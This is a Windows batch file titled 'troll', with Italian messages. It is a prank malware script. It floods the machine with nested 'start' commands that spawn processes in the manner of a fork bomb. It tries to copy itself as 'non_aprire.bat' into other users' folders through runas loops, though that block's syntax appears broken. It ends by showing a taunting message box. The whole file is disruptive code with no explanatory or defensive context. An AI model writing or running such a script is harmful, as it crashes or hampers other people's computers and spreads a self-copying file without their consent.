@echo off
title troll
set valore=5,-1,1
for /l %%a in (1,1,15) do start start start start start start start start start start start start start start start start start start
for /l %%c in (%valore%) do for %%s in (a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do for /l %%t in (1,1,30) do (
	runas /user:GENTILI\utente%%c%%s%%t (
	copy non_aprire.bat D:\test\%%c%%s%%t\non_aprire.bat
	echo %%c%%s%%t
	)
)
echo x=msgbox("Per il solo gusto di farlo",10,"Sei stato trollato ma non sarai l'unico") >> troll.vbs
start troll.vbs